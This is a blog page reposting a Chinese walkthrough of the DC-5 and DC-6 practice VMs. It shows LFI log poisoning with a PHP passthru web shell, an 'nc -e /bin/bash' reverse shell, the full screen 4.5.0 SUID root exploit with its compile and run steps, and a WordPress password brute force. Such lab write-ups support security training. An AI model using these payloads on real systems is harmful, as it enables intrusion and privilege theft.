<!DOCTYPE HTML>
<html>

<head><meta name="generator" content="Hexo 3.9.0">
	<link rel="bookmark" type="image/x-icon" href="/img/logo_miccall.png">
	<link rel="shortcut icon" href="/img/logo_miccall.png">
	
			    <title>
    Knlvre
    </title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
    <link rel="stylesheet" href="knlvre.github.io/css/mic_main.css">
    <link rel="stylesheet" href="knlvre.github.io/css/dropdownMenu.css">
    <meta name="keywords" content="miccall">
    
    	<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
	 
    <noscript>
        <link rel="stylesheet" href="knlvre.github.io/css/noscript.css">
    </noscript>
    <style type="text/css">
        body:before {
          content: ' ';
          position: fixed;
          top: 0;
          background: url('knlvre.github.io/img/bg.jpg') center 0 no-repeat;
          right: 0;
          bottom: 0;
          left: 0;
          background-size: cover; 
        }
    </style>

			    
  
    <script type="text/x-mathjax-config">
      MathJax.Hub.Config({
        tex2jax: {
          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
          processEscapes: true,
          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
        }
      });
    </script>

    <script type="text/x-mathjax-config">
      MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax(), i;
        for (i=0; i < all.length; i += 1) {
          all[i].SourceElement().parentNode.className += ' has-jax';
        }
      });
    </script>
    <script async type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>
  


    <script src="knlvre.github.io/js/jquery.min.js"></script>
    <script src="knlvre.github.io/js/jquery.scrollex.min.js"></script>
    <script src="knlvre.github.io/js/jquery.scrolly.min.js"></script>
    <script src="knlvre.github.io/js/skel.min.js"></script>
    <script src="knlvre.github.io/js/util.js"></script>
    <script src="knlvre.github.io/js/main.js"></script>
	
</head>
    
		
<!-- Layouts -->



<!--  代码渲染  -->
<link rel="stylesheet" href="/css/prism_coy.css">
<link rel="stylesheet" href="/css/typo.css">
<!-- 文章页 -->
<body class="is-loading">
    <!-- Wrapper 外包 s-->
    <div id="wrapper" class="fade-in">
        <!-- Intro 头部显示 s -->
        <!-- Intro 头部显示 e -->
        <!-- Header 头部logo start -->
        <header id="header">
    <a href="knlvre.github.io/" class="logo">MICCALL</a>
</header>
        <!-- Nav 导航条 start -->
        <nav id="nav" class="special">
            <ul class="menu links">
			<!-- Homepage  主页  --> 
			<li>
	            <a href="knlvre.github.io/" rel="nofollow">主页</a>
	        </li>
			<!-- categories_name  分类   --> 
	        
	        <li class="active">
	            <a href="#s1">分类</a>
	                    <ul class="submenu">
	                        <li>
	                        
	                    </li></ul>
	        </li>
	        
	        <!-- archives  归档   --> 
	        
	        
		        <!-- Pages 自定义   -->
		        
		        <li>
		            <a href="/about/" title="简历">
		                简历
		            </a>
		        </li>
		        
		        <li>
		            <a href="/group/" title="团队">
		                团队
		            </a>
		        </li>
		        
		        <li>
		            <a href="/gallery/" title="图库">
		                图库
		            </a>
		        </li>
		        
		        <li>
		            <a href="/tag/" title="标签">
		                标签
		            </a>
		        </li>
		        


            </ul>
            <!-- icons 图标   -->
			<ul class="icons">
                    
                    <li>
                        <a title="github" href="https://github.com/miccall" target="_blank" rel="noopener">
                            <i class="icon fa fa-github"></i>
                        </a>
                    </li>
                    
                    <li>
                        <a title="500px" href="http://500px.com" target="_blank" rel="noopener">
                            <i class="icon fa fa-500px"></i>
                        </a>
                    </li>
                    
			</ul>
</nav>

        <div id="main">
            <div class="post_page_title_img" style="height: 25rem;background-image: url();background-position: center; background-repeat:no-repeat; background-size:cover;-moz-background-size:cover;overflow:hidden;">
                <a href="#" style="padding: 4rem 4rem 2rem 4rem ;"><h2>DC-5至DC-8靶机渗透测试</h2></a>
            </div>
            <!-- Post -->
            <div class="typo" style="padding: 3rem;">
                <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>由于网络环境的变化，攻击机和靶机的IP可能发生改变。在每道题目中如果有改变，我会在开头的环境中写出来</p>
<p>转载自安全客原文：<a href="https://www.anquanke.com/post/id/187876" target="_blank" rel="noopener">https://www.anquanke.com/post/id/187876</a></p>
<h1 id="DC-5"><a href="#DC-5" class="headerlink" title="DC-5"></a>DC-5</h1><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>虚拟机平台：VMware Workstation Pro</p>
<p>攻击机：Kali（IP：192.168.43.84）</p>
<p>靶机：DC-5（IP：192.168.43.241）</p>
<h2 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h2><p>扫到IP之后，继续扫端口，开放<code>80</code>、<code>111</code>和<code>45549</code>端口</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@Knlvre:~# nmap -A -p- 192.168.43.241</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2019-09-24 10:21 CST</span><br><span class="line">Nmap scan report for dc-5 (192.168.43.241)</span><br><span class="line">Host is up (0.00066s latency).</span><br><span class="line">Not shown: 65532 closed ports</span><br><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">80/tcp    open  http    nginx 1.6.2</span><br><span class="line">|_http-server-header: nginx/1.6.2</span><br><span class="line">|_http-title: Welcome</span><br><span class="line">111/tcp   open  rpcbind 2-4 (RPC #100000)</span><br><span class="line">| rpcinfo: </span><br><span class="line">|   program version    port/proto  service</span><br><span class="line">|   100000  2,3,4        111/tcp   rpcbind</span><br><span class="line">|   100000  2,3,4        111/udp   rpcbind</span><br><span class="line">|   100000  3,4          111/tcp6  rpcbind</span><br><span class="line">|   100000  3,4          111/udp6  rpcbind</span><br><span class="line">|   100024  1          37784/udp   status</span><br><span class="line">|   100024  1          38492/udp6  status</span><br><span class="line">|   100024  1          45579/tcp   status</span><br><span class="line">|_  100024  1          46752/tcp6  status</span><br><span class="line">45579/tcp open  status  1 (RPC #100024)</span><br><span class="line">MAC Address: 00:0C:29:ED:57:59 (VMware)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.2 - 4.9</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.65 ms dc-5 (192.168.43.241)</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 24.52 seconds</span><br></pre></td></tr></table></figure>
<p>访问80端口，其他页面没有什么有用信息，<code>contact.php</code>页可以提交表单，表单提交到<code>thankyou.php</code>，测试Sql注入和XSS都不存在，扫目录也没有结果。看了大佬文章，目录扫出了<code>footer.php</code>，并且发现<code>thankyou.php</code>的<code>footer</code>每次访问都会改变，直接访问<code>footer.php</code>也是这样，年份在改变</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/5-1.png" alt="5-1"></p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/5-2.png" alt="5-2"></p>
<p>猜测这里是直接调用了<code>footer.php</code>（这里是直接调用，不是写在底部，因为跟 上面一样，每次访问年份都在变化）。应该是使用<code>include()</code>函数来包含了 <code>footer.php</code>文件，这样直接导致了LFI漏洞，下面我们来测试一下漏洞是否真的存在和看一下是否会过滤包含进来的文件，直接用<code>GET</code>加<code>file参数</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://192.168.43.241/thankyou.php?file=/etc/passwd</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/5-3.png" alt="5-3"></p>
<p>前面nmap的结果来看，中间件是<code>nginx</code>。并且因为网站的访问记录都会被写入日志当中，所以我们当前访问<code>/var/log/nginx/access.log</code>，可以访问</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://192.168.43.241/thankyou.php?file=/var/log/nginx/access.log</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/5-4.png" alt="5-4"></p>
<p>可以看到访问记录都被写进去了，那么我们就可以利用这个写马</p>
<p>Ps：此处不知道为什么不能用<code>eval()函数</code>，写入后没反应</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php passthru($_GET[&apos;cmd&apos;]); ?&gt;</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/5-5.png" alt="5-5"></p>
<p>会提示<code>404 Not Found</code>，但是已经成功写入日志，测试一下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">/thankyou.php?file=/var/log/nginx/access.log&amp;cmd=id</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/5-6.png" alt="5-6"></p>
<p>既然有被执行，现在就可以在攻击机监听端口，靶机那边主动连接</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#攻击机</span><br><span class="line">root@Knlvre:~# nc -lvp 3737</span><br><span class="line">listening on [any] 3737 ...</span><br><span class="line"></span><br><span class="line">#靶机</span><br><span class="line">/thankyou.php?file=/var/log/nginx/access.log&amp;cmd=nc -e /bin/bash 192.168.199.133 3737</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/5-7.png" alt="5-7"></p>
<p>拿到shell之后还只是www的权限，没有找到任何线索，<code>root</code>照样进不去，准备提权。python拿到交互式shell</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python -c &quot;import pty;pty.spawn(&apos;/bin/bash&apos;)&quot;</span><br><span class="line">www-data@dc-5:~/html$</span><br></pre></td></tr></table></figure>
<p>参考别人文章，下载了一款Linux越权检查工具到<code>/tmp</code>目录下，如下</p>
<p>Ps：或者下载到Kali内，以后上传到靶机</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh</span><br><span class="line">wget https://www.securitysift.com/download/linuxprivchecker.py</span><br><span class="line"></span><br><span class="line">#使用方法：两个都下载完之后，python linuxprivchecker.py，就可以了</span><br></pre></td></tr></table></figure>
<p>工具跑完之后给出了很多内容，我们这里关注到<code>SUID文件</code>部分，这里的<code>screen</code>可利用</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[+] SUID/SGID Files and Directories</span><br><span class="line">    -rwsr-xr-x 1 root root 40168 May 18  2017 /bin/su</span><br><span class="line">    -rwsr-xr-x 1 root root 40000 Mar 30  2015 /bin/mount</span><br><span class="line">    -rwsr-xr-x 1 root root 27416 Mar 30  2015 /bin/umount</span><br><span class="line">    -rwsr-xr-x 1 root root 1441352 Apr 19 23:48 /bin/screen-4.5.0</span><br><span class="line">    drwxr-s--- 2 mysql adm 4096 Apr 19 23:41 /var/log/mysql</span><br><span class="line">    drwxr-s--- 2 Debian-exim adm 4096 Apr 19 23:33 /var/log/exim4</span><br><span class="line">	...</span><br><span class="line">	...</span><br><span class="line">	...</span><br></pre></td></tr></table></figure>
<p><code>searchsploit</code>搜索<code>screen</code>，用这个<code>exploits/linux/local/41154.sh</code>，查看内容</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@Knlvre:~/screen# cat 41154.sh </span><br><span class="line">#!/bin/bash</span><br><span class="line"># screenroot.sh</span><br><span class="line"># setuid screen v4.5.0 local root exploit</span><br><span class="line"># abuses ld.so.preload overwriting to get root.</span><br><span class="line"># bug: https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html</span><br><span class="line"># HACK THE PLANET</span><br><span class="line"># ~ infodox (25/1/2017) </span><br><span class="line">echo &quot;~ gnu/screenroot ~&quot;</span><br><span class="line">echo &quot;[+] First, we create our shell and library...&quot;</span><br><span class="line">cat &lt;&lt; EOF &gt; /tmp/libhax.c</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;sys/types.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">__attribute__ ((__constructor__))</span><br><span class="line">void dropshell(void)&#123;</span><br><span class="line">    chown(&quot;/tmp/rootshell&quot;, 0, 0);</span><br><span class="line">    chmod(&quot;/tmp/rootshell&quot;, 04755);</span><br><span class="line">    unlink(&quot;/etc/ld.so.preload&quot;);</span><br><span class="line">    printf(&quot;[+] done!\n&quot;);</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line">gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c</span><br><span class="line">rm -f /tmp/libhax.c</span><br><span class="line">cat &lt;&lt; EOF &gt; /tmp/rootshell.c</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main(void)&#123;</span><br><span class="line">    setuid(0);</span><br><span class="line">    setgid(0);</span><br><span class="line">    seteuid(0);</span><br><span class="line">    setegid(0);</span><br><span class="line">    execvp(&quot;/bin/sh&quot;, NULL, NULL);</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line">gcc -o /tmp/rootshell /tmp/rootshell.c</span><br><span class="line">rm -f /tmp/rootshell.c</span><br><span class="line">echo &quot;[+] Now we create our /etc/ld.so.preload file...&quot;</span><br><span class="line">cd /etc</span><br><span class="line">umask 000 # because</span><br><span class="line">screen -D -m -L ld.so.preload echo -ne  &quot;\x0a/tmp/libhax.so&quot; # newline needed</span><br><span class="line">echo &quot;[+] Triggering...&quot;</span><br><span class="line">screen -ls # screen itself is setuid, so... </span><br><span class="line">/tmp/rootshell</span><br></pre></td></tr></table></figure>
<p>但是脚本是错的，运行需要执行一些步骤：</p>
<p>①将上面这个bash文件的内容单独复制出来，写入<code>libhax.c</code>文件，然后执行如下命令（记得更改文件路径），会生成一个<code>libhax.so</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@Knlvre:~/screen# vi libhax.c</span><br><span class="line"></span><br><span class="line">root@Knlvre:~/screen# cat libhax.c </span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;sys/types.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">__attribute__ ((__constructor__))</span><br><span class="line">void dropshell(void)&#123;</span><br><span class="line">    chown(&quot;/tmp/rootshell&quot;, 0, 0);</span><br><span class="line">    chmod(&quot;/tmp/rootshell&quot;, 04755);</span><br><span class="line">    unlink(&quot;/etc/ld.so.preload&quot;);</span><br><span class="line">    printf(&quot;[+] done!\n&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>②把另一段也复制出来，写入<code>rootshell.c</code>，执行如下命令（同样记得修改路径），会生成一个<code>rootshell</code>文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@Knlvre:~/screen# vi rootshell.c</span><br><span class="line"></span><br><span class="line">root@Knlvre:~/screen# cat rootshell.c </span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main(void)&#123;</span><br><span class="line">    setuid(0);</span><br><span class="line">    setgid(0);</span><br><span class="line">    seteuid(0);</span><br><span class="line">    setegid(0);</span><br><span class="line">    execvp(&quot;/bin/sh&quot;, NULL, NULL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>编译文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@Knlvre:~/screen# gcc -fPIC -shared -ldl -o ./libhax.so ./libhax.c</span><br><span class="line">./libhax.c: In function ‘dropshell’:</span><br><span class="line">./libhax.c:7:5: warning: implicit declaration of function ‘chmod’ [-Wimplicit-function-declaration]</span><br><span class="line">    7 |     chmod(&quot;/tmp/rootshell&quot;, 04755);</span><br><span class="line">      |     ^~~~~</span><br><span class="line">      </span><br><span class="line"></span><br><span class="line">root@Knlvre:~/screen# gcc -o ./rootshell ./rootshell.c</span><br><span class="line">./rootshell.c: In function ‘main’:</span><br><span class="line">./rootshell.c:3:5: warning: implicit declaration of function ‘setuid’ [-Wimplicit-function-declaration]</span><br><span class="line">    3 |     setuid(0);</span><br><span class="line">      |     ^~~~~~</span><br><span class="line">...</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>修改完之后，需要将这2个文件上传到靶机的<code>/tmp</code>目录下，新学到两种方法：</p>
<p>方法一：利用Python</p>
<p>在服务器端如果拥有Python2环境，可以将<code>当前目录</code>作为根目录，临时搭建一个<code>Web服务器</code>，可以自己指定<code>端口</code>，命令如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python2 -m SimpleHTTPServer [端口]</span><br><span class="line"></span><br><span class="line">#Python3环境下：python3 -m http.server [端口]</span><br></pre></td></tr></table></figure>
<p>以本次为例</p>
<p>攻击机端：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@Knlvre:~/screen# python -m SimpleHTTPServer 7373</span><br><span class="line">Serving HTTP on 0.0.0.0 port 7373 ...</span><br></pre></td></tr></table></figure>
<p>靶机端：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">www-data@dc-5:/tmp$ wget http://192.168.199.133:7373/libhax.so         </span><br><span class="line">wget http://192.168.199.133:7373/dc5.sh</span><br><span class="line">converted &apos;http://192.168.199.133:7373/dc5.sh&apos; (ANSI_X3.4-1968) -&gt; &apos;http://192.168.199.133:7373/dc5.sh&apos; (UTF-8)</span><br><span class="line">--2019-09-25 03:23:03--  http://192.168.199.133:7373/dc5.sh</span><br><span class="line">Connecting to 192.168.199.133:7373... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 267 [text/x-sh]</span><br><span class="line">Saving to: &apos;dc5.sh&apos;</span><br><span class="line"></span><br><span class="line">dc5.sh              100%[=====================&gt;]     267  --.-KB/s   in 0s     </span><br><span class="line"></span><br><span class="line">2019-09-25 03:23:03 (29.0 MB/s) - &apos;dc5.sh&apos; saved [267/267]</span><br></pre></td></tr></table></figure>
<p>传输完成后，服务器端也会有反馈</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@Knlvre:~/screen# python -m SimpleHTTPServer 7373</span><br><span class="line">Serving HTTP on 0.0.0.0 port 7373 ...</span><br><span class="line">192.168.199.153 - - [24/Sep/2019 18:30:43] &quot;GET /libhax.so HTTP/1.1&quot; 200 -</span><br></pre></td></tr></table></figure>
<p>方法二：利用nc</p>
<p>攻击机端：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -lnvp 7373 &lt; /root/screen/libhax.so -q 1</span><br><span class="line">#-q 参数表示获取文件后1秒关闭</span><br><span class="line"></span><br><span class="line">root@Knlvre:~/screen# nc -lnvp 7373 &lt; /root/screen/libhax.so -q 1</span><br><span class="line">listening on [any] 7373 ...</span><br></pre></td></tr></table></figure>
<p>靶机端：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc 192.168.199.133 7373 &gt; libhax.so</span><br></pre></td></tr></table></figure>
<p>传输完成后，服务器端也会有反馈</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@Knlvre:~/screen# nc -lnvp 7373 &lt; /root/screen/libhax.so -q 1</span><br><span class="line">listening on [any] 7373 ...</span><br><span class="line">connect to [192.168.199.133] from (UNKNOWN) [192.168.199.153] 58647</span><br></pre></td></tr></table></figure>
<p>结束</p>
<p>将<code>libhax.so、rootshell</code>下载到<code>/tmp</code>目录下之后</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">www-data@dc-5:/tmp$ ls</span><br><span class="line">libhax.so  rootshell</span><br></pre></td></tr></table></figure>
<p>还是照着脚本说的做，提权成功</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">www-data@dc-5:/tmp$ cd /etc </span><br><span class="line"></span><br><span class="line">www-data@dc-5:/etc$ umask 000</span><br><span class="line"></span><br><span class="line">www-data@dc-5:/etc$ screen -D -m -L ld.so.preload echo -ne  &quot;\x0a/tmp/libhax.so&quot;</span><br><span class="line"></span><br><span class="line">www-data@dc-5:/etc$ screen -ls</span><br><span class="line">&apos; from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.</span><br><span class="line">[+] done!</span><br><span class="line">No Sockets found in /tmp/screens/S-www-data.</span><br><span class="line"></span><br><span class="line">www-data@dc-5:/etc$ /tmp/rootshell</span><br><span class="line"># id</span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root),33(www-data)</span><br></pre></td></tr></table></figure>
<p>查找并查看flag，通关</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># find / -name &quot;*flag*&quot;</span><br><span class="line">/var/lib/mysql/debian-5.5.flag</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">/usr/lib/x86_64-linux-gnu/perl/5.20.2/bits/waitflags.ph</span><br><span class="line">/root/thisistheflag.txt</span><br><span class="line"></span><br><span class="line"># cat /root/thisistheflag.txt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">888b    888 d8b                                                      888      888 888 888 </span><br><span class="line">8888b   888 Y8P                                                      888      888 888 888 </span><br><span class="line">88888b  888                                                          888      888 888 888 </span><br><span class="line">888Y88b 888 888  .d8888b .d88b.       888  888  888  .d88b.  888d888 888  888 888 888 888 </span><br><span class="line">888 Y88b888 888 d88P&quot;   d8P  Y8b      888  888  888 d88&quot;&quot;88b 888P&quot;   888 .88P 888 888 888 </span><br><span class="line">888  Y88888 888 888     88888888      888  888  888 888  888 888     888888K  Y8P Y8P Y8P </span><br><span class="line">888   Y8888 888 Y88b.   Y8b.          Y88b 888 d88P Y88..88P 888     888 &quot;88b  &quot;   &quot;   &quot;  </span><br><span class="line">888    Y888 888  &quot;Y8888P &quot;Y8888        &quot;Y8888888P&quot;   &quot;Y88P&quot;  888     888  888 888 888 888 </span><br><span class="line">                                                                                          </span><br><span class="line">                                                                                          </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Once again, a big thanks to all those who do these little challenges,</span><br><span class="line">and especially all those who give me feedback - again, it&apos;s all greatly</span><br><span class="line">appreciated.  :-)</span><br><span class="line"></span><br><span class="line">I also want to send a big thanks to all those who find the vulnerabilities</span><br><span class="line">and create the exploits that make these challenges possible.</span><br><span class="line"></span><br><span class="line">#</span><br></pre></td></tr></table></figure>
<h1 id="DC-6"><a href="#DC-6" class="headerlink" title="DC-6"></a>DC-6</h1><h2 id="环境-1"><a href="#环境-1" class="headerlink" title="环境"></a>环境</h2><p>虚拟机平台：VMware Workstation Pro</p>
<p>攻击机：Kali（IP：192.168.199.133）</p>
<p>靶机：DC-6（IP：192.168.199.107）</p>
<h2 id="渗透测试-1"><a href="#渗透测试-1" class="headerlink" title="渗透测试"></a>渗透测试</h2><p><code>nmap</code>扫描IP，开放<code>22</code>和<code>80</code>端口，但是访问80却发现解析不了，仔细一看，又是重定向问题</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@Knlvre:/~# nmap -p- -A 192.168.199.107</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2019-09-25 17:54 CST</span><br><span class="line">Nmap scan report for dc-6.lan (192.168.199.107)</span><br><span class="line">Host is up (0.00081s latency).</span><br><span class="line">Not shown: 65533 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 3e:52:ce:ce:01:b6:94:eb:7b:03:7d:be:08:7f:5f:fd (RSA)</span><br><span class="line">|   256 3c:83:65:71:dd:73:d7:23:f8:83:0d:e3:46:bc:b5:6f (ECDSA)</span><br><span class="line">|_  256 41:89:9e:85:ae:30:5b:e0:8f:a4:68:71:06:b4:15:ee (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.25 ((Debian))</span><br><span class="line">|_http-server-header: Apache/2.4.25 (Debian)</span><br><span class="line">|_http-title: Did not follow redirect to http://wordy/</span><br><span class="line">|_https-redirect: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">MAC Address: 00:0C:29:D5:AC:59 (VMware)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">...</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>继续修改<code>hosts</code>，添加如下记录</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">192.168.199.107	wordy</span><br></pre></td></tr></table></figure>
<p>添加完之后重新访问就可以了，又是<code>WordPress</code>。继续用<code>wpscan</code>扫描用户</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@Knlvre:/~# wpscan --url http://wordy/ -e u</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">[i] User(s) Identified:</span><br><span class="line"></span><br><span class="line">[+] admin</span><br><span class="line"> | Detected By: Rss Generator (Passive Detection)</span><br><span class="line"> | Confirmed By:</span><br><span class="line"> |  Wp Json Api (Aggressive Detection)</span><br><span class="line"> |   - http://wordy/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1</span><br><span class="line"> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> |  Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[+] sarah</span><br><span class="line"> | Detected By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[+] graham</span><br><span class="line"> | Detected By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[+] mark</span><br><span class="line"> | Detected By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[+] jens</span><br><span class="line"> | Detected By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br><span class="line">...</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p><code>cewl</code>抓关键词</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@Knlvre:/~# cewl http://wordy -w passwords_dc6.txt</span><br><span class="line">CeWL 5.4.6 (Exclusion) Robin Wood (robin@digi.ninja) (https://digi.ninja/)</span><br></pre></td></tr></table></figure>
<p><code>wpscan</code>爆破用户名密码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@Knlvre:/~# wpscan --url http://wordy/ -U users_dc6.txt -P passwords_dc6.txt</span><br></pre></td></tr></table></figure>
<p>不是很顺利，爆破没有结果。想要用<code>rockyou.txt</code>爆破，但是记录是在太多了，猴年马月才能爆破完，所以这个时候，官网给了提示</p>
<blockquote>
<p>OK, this isn’t really a clue as such, but more of some “we don’t want to spend five years waiting for a certain process to finish” kind of advice for those who just want to get on with the job.</p>
<p>cat /usr/share/wordlists/rockyou.txt | grep k01 &gt; passwords.txt That should save you a few years. ;-)</p>
</blockquote>
<p> 就按照提示生成密码文本</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@Knlvre:/~# cat /usr/share/wordlists/rockyou.txt | grep k01 &gt; passwords_dc6.txt</span><br><span class="line"></span><br><span class="line">root@Knlvre:/~# wc -l passwords_dc6.txt</span><br><span class="line">2668 passwords_dc6</span><br></pre></td></tr></table></figure>
<p>然后再次爆破</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@Knlvre:/~# wpscan --url http://wordy/ -U users_dc6 -P passwords_dc6</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">[i] No Config Backups Found.</span><br><span class="line">[+] Performing password attack on Xmlrpc against 5 user/s</span><br><span class="line">[SUCCESS] - mark / helpdesk01</span><br><span class="line">...</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<blockquote>
<p>用户名：mark</p>
<p>密码：helpdesk01</p>
</blockquote>
<p>进入后台之后没有发现，继续按照之前的方法去尝试<code>ssh</code>，看<code>mark</code>会不会重复使用这个密码，但是无果</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@Knlvre:~# ssh mark@192.168.199.107</span><br><span class="line">The authenticity of host &apos;192.168.199.107 (192.168.199.107)&apos; can&apos;t be established.</span><br><span class="line">ECDSA key fingerprint is SHA256:jlerdCouZvnDhR/1oNiOrfqqzChsDT0gm8uG96kRY2U.</span><br><span class="line">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span><br><span class="line">Warning: Permanently added &apos;192.168.199.107&apos; (ECDSA) to the list of known hosts.</span><br><span class="line">mark@192.168.199.107&apos;s password: </span><br><span class="line">Permission denied, please try again.</span><br></pre></td></tr></table></figure>
<p>继续回到网页，然后发现了网页中的一款插件<code>Activity monitor</code></p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/6-1.png" alt="6-1"></p>
<p><code>searchsploit</code>搜索关键词<code>wordpress activity monitor</code></p>
